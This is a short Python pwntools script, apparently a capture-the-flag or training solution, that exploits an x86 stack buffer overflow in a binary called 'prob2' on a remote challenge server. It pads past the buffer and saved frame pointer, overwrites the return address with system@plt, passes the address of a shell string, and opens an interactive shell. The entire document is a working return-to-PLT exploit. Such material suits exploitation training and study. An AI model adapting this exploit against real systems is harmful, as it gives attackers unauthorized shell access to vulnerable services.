"""
Concept : x86 BOF
Knowledge : 
- 콜링 컨벤션
- plt, got
- RTL
"""

from pwn import *
context.terminal=['tmux', 'splitw', '-h']

#p = process("./prob2")
p = remote("fsi.zzado.kr", 9932)
e = ELF("./03 Pwn/prob2")
 

system = e.plt['system']
sh_str =  0x0804A034
main = e.symbols['main']
log.info(hex(system))


#gdb.attach(p,'b* vulns')
p.recv()


payload =  b'a' * 0x20
payload += b'b' * 0x4
payload += p32(system)
payload += b'c' * 0x4
payload += p32(sh_str)

p.send(payload)
#p.send(b"a"*0x20 + b"b"*0x4 + p32(sh_addr))
p.interactive()